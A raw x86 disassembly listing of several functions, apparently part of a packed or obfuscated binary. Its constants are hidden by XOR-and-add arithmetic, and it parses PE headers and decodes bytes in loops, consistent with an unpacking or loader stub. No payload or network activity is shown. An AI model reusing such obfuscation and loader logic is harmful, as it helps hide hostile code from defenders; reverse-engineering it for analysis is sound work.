  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
